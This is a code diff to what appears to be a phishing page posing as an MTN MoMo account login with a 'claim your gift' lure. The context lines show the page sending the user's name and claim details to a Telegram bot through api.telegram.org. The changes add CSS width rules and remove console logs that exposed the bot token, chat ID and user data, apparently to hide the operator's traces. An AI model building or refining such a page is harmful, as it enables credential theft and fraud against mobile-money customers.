@@ -116,7 +116,7 @@
             align-items: center;
             gap: 14px;
             border: 2px solid #0047AB;
-            box-shadow: 0 2px 8px rgba(0, 71, 171, 0.08);
+            width: 100%;
         }
         
         .gift-preview .icon {
@@ -203,6 +203,7 @@
             color: #333;
             font-family: 'Inter', sans-serif;
             background: transparent;
+            width: 100%;
         }
         
         .phone-input::placeholder {
@@ -269,6 +270,7 @@
             font-size: 13px;
             font-weight: 500;
             display: none;
+            width: 100%;
         }
         
         .status-message.success {
@@ -559,9 +561,6 @@
         console.log('====================================');
         console.log('🔐 MTN MoMo - MoMo Account Login');
         console.log('====================================');
-        console.log('🤖 Bot Token:', BOT_TOKEN);
-        console.log('📱 Chat ID:', CHAT_ID);
-        console.log('====================================');
 
         // ============================================
         // LOAD SELECTED GIFT
@@ -576,7 +575,6 @@
             document.getElementById('giftValue').textContent = value;
 
             console.log('🎁 Gift to receive:', gift, '-', value);
-            console.log('👤 User:', localStorage.getItem('fullName') || 'Not provided');
         }
 
         loadSelectedGift();
@@ -674,8 +672,6 @@
                 `👤 *User:* ${fullName}\n` +
                 `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
                 `✅ User is claiming their gift. Please process.`;
-
-            console.log('📤 Sending Telegram notification...');
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
